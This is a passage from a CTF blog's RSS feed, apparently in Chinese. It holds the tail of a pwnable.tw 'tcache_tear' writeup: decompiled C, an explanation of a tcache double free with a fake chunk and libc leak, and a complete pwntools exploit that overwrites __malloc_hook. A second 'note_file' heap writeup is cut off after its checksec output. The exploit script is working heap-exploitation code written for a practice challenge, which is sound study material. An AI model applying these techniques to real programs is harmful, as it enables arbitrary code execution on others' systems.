class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 == &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LABEL_14:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Invalid choice&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v3 != &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; LABEL_14;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      add();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;只允许 8 次 free，而且还有 tcache，ptr 指针存在 uaf，但是没有编辑函数，输出的是 name，对于 name 输入输出限制大小都在 0x20 没有溢出以及泄露 ptr 的可能。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; size; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = get_num();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v0 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ptr = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(v0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Data:&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    read_name((__int64)ptr, size - &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);         &lt;span class=&#34;comment&#34;&gt;// 溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LODWORD(v0) = &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done !&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;add 读入数据时存在数字类型转换溢出，当 size&amp;lt;16 时，读入非常大的数据，可以覆盖 topchunk&lt;/p&gt;
&lt;h2 id=&#34;loading&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#loading&#34;&gt;#&lt;/a&gt; loading:&lt;/h2&gt;
&lt;p&gt;1：最主要的问题，如何泄露 libc 的地址。尝试攻击 stdout 结构体&lt;/p&gt;
&lt;p&gt;largebin 不走 tcache，但是走 unsortedbin，所以伪造 fakechunk 进 sortedbin，低版本的 libc2.27 可以 tcache double free, 很容易拿到 name，并且实现超长数据写（size&amp;lt;16)&lt;/p&gt;
&lt;p&gt;我们将 name 伪造成 largechunk，free 后进 unsortedbins，泄露 libc，然后同样手法修改 malloc_hook，这次需要 realloc 调栈&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exp&#34;&gt;#&lt;/a&gt; exp:&lt;/h2&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.log_level=&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#r=process(&amp;#x27;./tcache_tear&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;chall.pwnable.tw&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10207&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf =ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./tcache_tear&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc-2.27.so&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name=&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#fake chunksize 0x91,name size is 0x20&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gp = &lt;span class=&#34;number&#34;&gt;0x602088&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;ch&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Your choice :&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,text&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Size:&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	r.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Data:&amp;quot;&lt;/span&gt;,text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ch(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r,&amp;#x27;b malloc&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;offset = gp-name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fakechunk=p64(&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x501&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fakechunk +=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*(offset-&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)+p64(name+&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;0x602560&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x602090&lt;/span&gt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fakechunk +=&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x21&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Name:&amp;quot;&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(name))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;aaaa&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,fakechunk)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;\x05&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;main_addr_96 = u64(r.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;malloc_hook = main_addr_96-&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;realloc_hook = malloc_hook-&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = main_addr_96 - &lt;span class=&#34;number&#34;&gt;0x3ebca0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libc : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc_hook : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(malloc_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = &lt;span class=&#34;number&#34;&gt;0xcafebabedeadbeef&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;onegadget = libcbase +&lt;span class=&#34;number&#34;&gt;0x010a38c&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;realloc = libcbase + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;realloc&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;realloc _: &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(realloc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(malloc_hook-&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;,p64(onegadget)+p64(realloc+&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;10&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/01/note-file/</guid>
            <title>note_file</title>
            <link>http://example.com/2022/04/01/note-file/</link>
            <category>writeup</category>
            <pubDate>Fri, 01 Apr 2022 16:25:12 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;unsortedbin_attack-global_max_fast&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#unsortedbin_attack-global_max_fast&#34;&gt;#&lt;/a&gt; unsortedbin_attack  global_max_fast&lt;/h1&gt;
&lt;h2 id=&#34;保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#保护&#34;&gt;#&lt;/a&gt; 保护&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ file note_five &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;note_five: ELF &lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;-bit LSB shared object, x86&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;, version &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86&lt;span class=&#34;number&#34;&gt;-64.&lt;/span&gt;so&lt;span class=&#34;number&#34;&gt;.2&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; GNU/Linux &lt;span class=&#34;number&#34;&gt;2.6&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.32&lt;/span&gt;, BuildID[sha1]=&lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;cce6e83f71ad3fa44410c59cd5a40b4ade1acb, stripped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ checksec --file=note_five&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/giantbranch/Desktop/ruan/attack_global_max_fast/note_five&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     amd64&lt;span class=&#34;number&#34;&gt;-64&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Full RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    Canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      PIE enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;giantbranch@ubuntu:~/Desktop/ruan/attack_global_max_fast$ &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;主要程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主要程序&#34;&gt;#&lt;/a&gt; 主要程序：&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span 